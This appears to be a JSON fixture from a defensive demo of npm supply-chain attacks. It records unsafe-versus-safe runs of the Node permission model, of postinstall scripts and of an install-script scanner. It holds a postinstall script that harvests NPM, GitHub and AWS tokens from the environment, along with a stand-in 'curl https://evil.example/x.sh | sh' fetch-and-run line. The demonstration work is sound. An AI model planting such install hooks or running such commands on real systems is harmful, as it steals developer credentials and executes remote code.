@@ -1,0 +1,431 @@
+{
+  "permission\n{\"grants\":[\"child-process\",\"fs-write\"]}": {
+    "unsafe": {
+      "command": "node permission-demo/app.mjs",
+      "attempts": [
+        {
+          "action": "read own data file",
+          "result": "allowed"
+        },
+        {
+          "action": "read ../package.json",
+          "result": "allowed"
+        },
+        {
+          "action": "read /etc/hosts",
+          "result": "allowed"
+        },
+        {
+          "action": "write to tmp",
+          "result": "allowed"
+        },
+        {
+          "action": "spawn child process",
+          "result": "allowed"
+        }
+      ],
+      "warnings": [],
+      "exploited": true
+    },
+    "safe": {
+      "command": "node --permission --allow-fs-read=./permission-demo --allow-child-process --allow-fs-write=$TMPDIR permission-demo/app.mjs",
+      "attempts": [
+        {
+          "action": "read own data file",
+          "result": "allowed"
+        },
+        {
+          "action": "read ../package.json",
+          "result": "ERR_ACCESS_DENIED"
+        },
+        {
+          "action": "read /etc/hosts",
+          "result": "ERR_ACCESS_DENIED"
+        },
+        {
+          "action": "write to tmp",
+          "result": "allowed"
+        },
+        {
+          "action": "spawn child process",
+          "result": "allowed"
+        },
+        {
+          "action": "process.permission.has(\"fs.read\", \"/etc/passwd\")",
+          "result": "false"
+        }
+      ],
+      "warnings": [
+        "SecurityWarning: The flag --allow-child-process must be used with extreme caution. It could invalidate the permission model."
+      ],
+      "exploited": false
+    }
+  },
+  "permission\n{\"grants\":[\"child-process\"]}": {
+    "unsafe": {
+      "command": "node permission-demo/app.mjs",
+      "attempts": [
+        {
+          "action": "read own data file",
+          "result": "allowed"
+        },
+        {
+          "action": "read ../package.json",
+          "result": "allowed"
+        },
+        {
+          "action": "read /etc/hosts",
+          "result": "allowed"
+        },
+        {
+          "action": "write to tmp",
+          "result": "allowed"
+        },
+        {
+          "action": "spawn child process",
+          "result": "allowed"
+        }
+      ],
+      "warnings": [],
+      "exploited": true
+    },
+    "safe": {
+      "command": "node --permission --allow-fs-read=./permission-demo --allow-child-process permission-demo/app.mjs",
+      "attempts": [
+        {
+          "action": "read own data file",
+          "result": "allowed"
+        },
+        {
+          "action": "read ../package.json",
+          "result": "ERR_ACCESS_DENIED"
+        },
+        {
+          "action": "read /etc/hosts",
+          "result": "ERR_ACCESS_DENIED"
+        },
+        {
+          "action": "write to tmp",
+          "result": "ERR_ACCESS_DENIED"
+        },
+        {
+          "action": "spawn child process",
+          "result": "allowed"
+        },
+        {
+          "action": "process.permission.has(\"fs.read\", \"/etc/passwd\")",
+          "result": "false"
+        }
+      ],
+      "warnings": [
+        "SecurityWarning: The flag --allow-child-process must be used with extreme caution. It could invalidate the permission model."
+      ],
+      "exploited": false
+    }
+  },
+  "permission\n{\"grants\":[\"fs-write\"]}": {
+    "unsafe": {
+      "command": "node permission-demo/app.mjs",
+      "attempts": [
+        {
+          "action": "read own data file",
+          "result": "allowed"
+        },
+        {
+          "action": "read ../package.json",
+          "result": "allowed"
+        },
+        {
+          "action": "read /etc/hosts",
+          "result": "allowed"
+        },
+        {
+          "action": "write to tmp",
+          "result": "allowed"
+        },
+        {
+          "action": "spawn child process",
+          "result": "allowed"
+        }
+      ],
+      "warnings": [],
+      "exploited": true
+    },
+    "safe": {
+      "command": "node --permission --allow-fs-read=./permission-demo --allow-fs-write=$TMPDIR permission-demo/app.mjs",
+      "attempts": [
+        {
+          "action": "read own data file",
+          "result": "allowed"
+        },
+        {
+          "action": "read ../package.json",
+          "result": "ERR_ACCESS_DENIED"
+        },
+        {
+          "action": "read /etc/hosts",
+          "result": "ERR_ACCESS_DENIED"
+        },
+        {
+          "action": "write to tmp",
+          "result": "allowed"
+        },
+        {
+          "action": "spawn child process",
+          "result": "ERR_ACCESS_DENIED"
+        },
+        {
+          "action": "process.permission.has(\"fs.read\", \"/etc/passwd\")",
+          "result": "false"
+        }
+      ],
+      "warnings": [],
+      "exploited": false
+    }
+  },
+  "permission\n{\"grants\":[]}": {
+    "unsafe": {
+      "command": "node permission-demo/app.mjs",
+      "attempts": [
+        {
+          "action": "read own data file",
+          "result": "allowed"
+        },
+        {
+          "action": "read ../package.json",
+          "result": "allowed"
+        },
+        {
+          "action": "read /etc/hosts",
+          "result": "allowed"
+        },
+        {
+          "action": "write to tmp",
+          "result": "allowed"
+        },
+        {
+          "action": "spawn child process",
+          "result": "allowed"
+        }
+      ],
+      "warnings": [],
+      "exploited": true
+    },
+    "safe": {
+      "command": "node --permission --allow-fs-read=./permission-demo permission-demo/app.mjs",
+      "attempts": [
+        {
+          "action": "read own data file",
+          "result": "allowed"
+        },
+        {
+          "action": "read ../package.json",
+          "result": "ERR_ACCESS_DENIED"
+        },
+        {
+          "action": "read /etc/hosts",
+          "result": "ERR_ACCESS_DENIED"
+        },
+        {
+          "action": "write to tmp",
+          "result": "ERR_ACCESS_DENIED"
+        },
+        {
+          "action": "spawn child process",
+          "result": "ERR_ACCESS_DENIED"
+        },
+        {
+          "action": "process.permission.has(\"fs.read\", \"/etc/passwd\")",
+          "result": "false"
+        }
+      ],
+      "warnings": [],
+      "exploited": false
+    }
+  },
+  "postinstall\n{\"tokens\":[\"AWS_SECRET_ACCESS_KEY\"]}": {
+    "script": "// Runs automatically during `npm install`.\nconst fs = require('fs');\nconst path = require('path');\nconst loot = {};\nfor (const name of [\"NPM_TOKEN\",\"GITHUB_TOKEN\",\"AWS_SECRET_ACCESS_KEY\"]) {\n  if (process.env[name]) loot[name] = process.env[name];\n}\n// A real attack sends this to the attacker's server.\n// The demo writes it to a file instead, so nothing leaves your machine.\nfs.writeFileSync(path.join(process.env.INIT_CWD, 'exfiltrated.json'), JSON.stringify(loot, null, 2));\n",
+    "unsafe": {
+      "command": "AWS_SECRET_ACCESS_KEY=FAKE/demo/aws/secret/789 npm install $TMP/totally-legit-utils-1.0.0.tgz",
+      "output": "added 1 package in 175ms",
+      "exitCode": 0,
+      "exfiltrated": {
+        "AWS_SECRET_ACCESS_KEY": "FAKE/demo/aws/secret/789"
+      },
+      "exploited": true
+    },
+    "safe": {
+      "command": "AWS_SECRET_ACCESS_KEY=FAKE/demo/aws/secret/789 npm install --ignore-scripts $TMP/totally-legit-utils-1.0.0.tgz",
+      "output": "added 1 package in 143ms",
+      "exitCode": 0,
+      "exfiltrated": null,
+      "exploited": false
+    }
+  },
+  "postinstall\n{\"tokens\":[\"GITHUB_TOKEN\",\"AWS_SECRET_ACCESS_KEY\"]}": {
+    "script": "// Runs automatically during `npm install`.\nconst fs = require('fs');\nconst path = require('path');\nconst loot = {};\nfor (const name of [\"NPM_TOKEN\",\"GITHUB_TOKEN\",\"AWS_SECRET_ACCESS_KEY\"]) {\n  if (process.env[name]) loot[name] = process.env[name];\n}\n// A real attack sends this to the attacker's server.\n// The demo writes it to a file instead, so nothing leaves your machine.\nfs.writeFileSync(path.join(process.env.INIT_CWD, 'exfiltrated.json'), JSON.stringify(loot, null, 2));\n",
+    "unsafe": {
+      "command": "GITHUB_TOKEN=ghp_FAKE_demo_token_456 AWS_SECRET_ACCESS_KEY=FAKE/demo/aws/secret/789 npm install $TMP/totally-legit-utils-1.0.0.tgz",
+      "output": "added 1 package in 208ms",
+      "exitCode": 0,
+      "exfiltrated": {
+        "GITHUB_TOKEN": "ghp_FAKE_demo_token_456",
+        "AWS_SECRET_ACCESS_KEY": "FAKE/demo/aws/secret/789"
+      },
+      "exploited": true
+    },
+    "safe": {
+      "command": "GITHUB_TOKEN=ghp_FAKE_demo_token_456 AWS_SECRET_ACCESS_KEY=FAKE/demo/aws/secret/789 npm install --ignore-scripts $TMP/totally-legit-utils-1.0.0.tgz",
+      "output": "added 1 package in 157ms",
+      "exitCode": 0,
+      "exfiltrated": null,
+      "exploited": false
+    }
+  },
+  "postinstall\n{\"tokens\":[\"GITHUB_TOKEN\"]}": {
+    "script": "// Runs automatically during `npm install`.\nconst fs = require('fs');\nconst path = require('path');\nconst loot = {};\nfor (const name of [\"NPM_TOKEN\",\"GITHUB_TOKEN\",\"AWS_SECRET_ACCESS_KEY\"]) {\n  if (process.env[name]) loot[name] = process.env[name];\n}\n// A real attack sends this to the attacker's server.\n// The demo writes it to a file instead, so nothing leaves your machine.\nfs.writeFileSync(path.join(process.env.INIT_CWD, 'exfiltrated.json'), JSON.stringify(loot, null, 2));\n",
+    "unsafe": {
+      "command": "GITHUB_TOKEN=ghp_FAKE_demo_token_456 npm install $TMP/totally-legit-utils-1.0.0.tgz",
+      "output": "added 1 package in 207ms",
+      "exitCode": 0,
+      "exfiltrated": {
+        "GITHUB_TOKEN": "ghp_FAKE_demo_token_456"
+      },
+      "exploited": true
+    },
+    "safe": {
+      "command": "GITHUB_TOKEN=ghp_FAKE_demo_token_456 npm install --ignore-scripts $TMP/totally-legit-utils-1.0.0.tgz",
+      "output": "added 1 package in 159ms",
+      "exitCode": 0,
+      "exfiltrated": null,
+      "exploited": false
+    }
+  },
+  "postinstall\n{\"tokens\":[\"NPM_TOKEN\",\"AWS_SECRET_ACCESS_KEY\"]}": {
+    "script": "// Runs automatically during `npm install`.\nconst fs = require('fs');\nconst path = require('path');\nconst loot = {};\nfor (const name of [\"NPM_TOKEN\",\"GITHUB_TOKEN\",\"AWS_SECRET_ACCESS_KEY\"]) {\n  if (process.env[name]) loot[name] = process.env[name];\n}\n// A real attack sends this to the attacker's server.\n// The demo writes it to a file instead, so nothing leaves your machine.\nfs.writeFileSync(path.join(process.env.INIT_CWD, 'exfiltrated.json'), JSON.stringify(loot, null, 2));\n",
+    "unsafe": {
+      "command": "NPM_TOKEN=npm_FAKE_demo_token_123 AWS_SECRET_ACCESS_KEY=FAKE/demo/aws/secret/789 npm install $TMP/totally-legit-utils-1.0.0.tgz",
+      "output": "added 1 package in 175ms",
+      "exitCode": 0,
+      "exfiltrated": {
+        "NPM_TOKEN": "npm_FAKE_demo_token_123",
+        "AWS_SECRET_ACCESS_KEY": "FAKE/demo/aws/secret/789"
+      },
+      "exploited": true
+    },
+    "safe": {
+      "command": "NPM_TOKEN=npm_FAKE_demo_token_123 AWS_SECRET_ACCESS_KEY=FAKE/demo/aws/secret/789 npm install --ignore-scripts $TMP/totally-legit-utils-1.0.0.tgz",
+      "output": "added 1 package in 143ms",
+      "exitCode": 0,
+      "exfiltrated": null,
+      "exploited": false
+    }
+  },
+  "postinstall\n{\"tokens\":[\"NPM_TOKEN\",\"GITHUB_TOKEN\",\"AWS_SECRET_ACCESS_KEY\"]}": {
+    "script": "// Runs automatically during `npm install`.\nconst fs = require('fs');\nconst path = require('path');\nconst loot = {};\nfor (const name of [\"NPM_TOKEN\",\"GITHUB_TOKEN\",\"AWS_SECRET_ACCESS_KEY\"]) {\n  if (process.env[name]) loot[name] = process.env[name];\n}\n// A real attack sends this to the attacker's server.\n// The demo writes it to a file instead, so nothing leaves your machine.\nfs.writeFileSync(path.join(process.env.INIT_CWD, 'exfiltrated.json'), JSON.stringify(loot, null, 2));\n",
+    "unsafe": {
+      "command": "NPM_TOKEN=npm_FAKE_demo_token_123 GITHUB_TOKEN=ghp_FAKE_demo_token_456 AWS_SECRET_ACCESS_KEY=FAKE/demo/aws/secret/789 npm install $TMP/totally-legit-utils-1.0.0.tgz",
+      "output": "added 1 package in 234ms",
+      "exitCode": 0,
+      "exfiltrated": {
+        "NPM_TOKEN": "npm_FAKE_demo_token_123",
+        "GITHUB_TOKEN": "ghp_FAKE_demo_token_456",
+        "AWS_SECRET_ACCESS_KEY": "FAKE/demo/aws/secret/789"
+      },
+      "exploited": true
+    },
+    "safe": {
+      "command": "NPM_TOKEN=npm_FAKE_demo_token_123 GITHUB_TOKEN=ghp_FAKE_demo_token_456 AWS_SECRET_ACCESS_KEY=FAKE/demo/aws/secret/789 npm install --ignore-scripts $TMP/totally-legit-utils-1.0.0.tgz",
+      "output": "added 1 package in 184ms",
+      "exitCode": 0,
+      "exfiltrated": null,
+      "exploited": false
+    }
+  },
+  "postinstall\n{\"tokens\":[\"NPM_TOKEN\",\"GITHUB_TOKEN\"]}": {
+    "script": "// Runs automatically during `npm install`.\nconst fs = require('fs');\nconst path = require('path');\nconst loot = {};\nfor (const name of [\"NPM_TOKEN\",\"GITHUB_TOKEN\",\"AWS_SECRET_ACCESS_KEY\"]) {\n  if (process.env[name]) loot[name] = process.env[name];\n}\n// A real attack sends this to the attacker's server.\n// The demo writes it to a file instead, so nothing leaves your machine.\nfs.writeFileSync(path.join(process.env.INIT_CWD, 'exfiltrated.json'), JSON.stringify(loot, null, 2));\n",
+    "unsafe": {
+      "command": "NPM_TOKEN=npm_FAKE_demo_token_123 GITHUB_TOKEN=ghp_FAKE_demo_token_456 npm install $TMP/totally-legit-utils-1.0.0.tgz",
+      "output": "added 1 package in 204ms",
+      "exitCode": 0,
+      "exfiltrated": {
+        "NPM_TOKEN": "npm_FAKE_demo_token_123",
+        "GITHUB_TOKEN": "ghp_FAKE_demo_token_456"
+      },
+      "exploited": true
+    },
+    "safe": {
+      "command": "NPM_TOKEN=npm_FAKE_demo_token_123 GITHUB_TOKEN=ghp_FAKE_demo_token_456 npm install --ignore-scripts $TMP/totally-legit-utils-1.0.0.tgz",
+      "output": "added 1 package in 169ms",
+      "exitCode": 0,
+      "exfiltrated": null,
+      "exploited": false
+    }
+  },
+  "postinstall\n{\"tokens\":[\"NPM_TOKEN\"]}": {
+    "script": "// Runs automatically during `npm install`.\nconst fs = require('fs');\nconst path = require('path');\nconst loot = {};\nfor (const name of [\"NPM_TOKEN\",\"GITHUB_TOKEN\",\"AWS_SECRET_ACCESS_KEY\"]) {\n  if (process.env[name]) loot[name] = process.env[name];\n}\n// A real attack sends this to the attacker's server.\n// The demo writes it to a file instead, so nothing leaves your machine.\nfs.writeFileSync(path.join(process.env.INIT_CWD, 'exfiltrated.json'), JSON.stringify(loot, null, 2));\n",
+    "unsafe": {
+      "command": "NPM_TOKEN=npm_FAKE_demo_token_123 npm install $TMP/totally-legit-utils-1.0.0.tgz",
+      "output": "added 1 package in 171ms",
+      "exitCode": 0,
+      "exfiltrated": {
+        "NPM_TOKEN": "npm_FAKE_demo_token_123"
+      },
+      "exploited": true
+    },
+    "safe": {
+      "command": "NPM_TOKEN=npm_FAKE_demo_token_123 npm install --ignore-scripts $TMP/totally-legit-utils-1.0.0.tgz",
+      "output": "added 1 package in 136ms",
+      "exitCode": 0,
+      "exfiltrated": null,
+      "exploited": false
+    }
+  },
+  "postinstall\n{\"tokens\":[]}": {
+    "script": "// Runs automatically during `npm install`.\nconst fs = require('fs');\nconst path = require('path');\nconst loot = {};\nfor (const name of [\"NPM_TOKEN\",\"GITHUB_TOKEN\",\"AWS_SECRET_ACCESS_KEY\"]) {\n  if (process.env[name]) loot[name] = process.env[name];\n}\n// A real attack sends this to the attacker's server.\n// The demo writes it to a file instead, so nothing leaves your machine.\nfs.writeFileSync(path.join(process.env.INIT_CWD, 'exfiltrated.json'), JSON.stringify(loot, null, 2));\n",
+    "unsafe": {
+      "command": "npm install $TMP/totally-legit-utils-1.0.0.tgz",
+      "output": "added 1 package in 420ms",
+      "exitCode": 0,
+      "exfiltrated": {},
+      "exploited": true
+    },
+    "safe": {
+      "command": "npm install --ignore-scripts $TMP/totally-legit-utils-1.0.0.tgz",
+      "output": "added 1 package in 363ms",
+      "exitCode": 0,
+      "exfiltrated": null,
+      "exploited": false
+    }
+  },
+  "scan\n{\"allow\":\"\"}": {
+    "unsafe": {
+      "command": "npm install   # no review step",
+      "output": "npm would run all of these, unreviewed:\n\n@scope/native@2.0.0\n  install: node-gyp rebuild (implicit, from binding.gyp)\ndeep@0.1.0\n  preinstall: node collect-env.js\nevil@6.6.6\n  postinstall: curl -s https://evil.example/x.sh | sh",
+      "exploited": true,
+      "label": "Runs unreviewed"
+    },
+    "safe": {
+      "command": "node scripts/find-install-scripts.js $TMP",
+      "output": "[REVIEW] @scope/native@2.0.0  install (implicit node-gyp)\n[REVIEW] deep@0.1.0  preinstall\n    preinstall: node collect-env.js\n[REVIEW] evil@6.6.6  postinstall\n    postinstall: curl -s https://evil.example/x.sh | sh",
+      "exitCode": 1,
+      "exploited": false,
+      "label": "Flagged for review"
+    }
+  },
+  "scan\n{\"allow\":\"@scope/native\"}": {
+    "unsafe": {
+      "command": "npm install   # no review step",
+      "output": "npm would run all of these, unreviewed:\n\n@scope/native@2.0.0\n  install: node-gyp rebuild (implicit, from binding.gyp)\ndeep@0.1.0\n  preinstall: node collect-env.js\nevil@6.6.6\n  postinstall: curl -s https://evil.example/x.sh | sh",
+      "exploited": true,
+      "label": "Runs unreviewed"
+    },
+    "safe": {
+      "command": "node scripts/find-install-scripts.js $TMP --allow @scope/native",
+      "output": "[allowed] @scope/native@2.0.0  install (implicit node-gyp)\n[REVIEW] deep@0.1.0  preinstall\n    preinstall: node collect-env.js\n[REVIEW] evil@6.6.6  postinstall\n    postinstall: curl -s https://evil.example/x.sh | sh",
+      "exitCode": 1,
+      "exploited": false,
+      "label": "Flagged for review"
+    }
+  }
+}
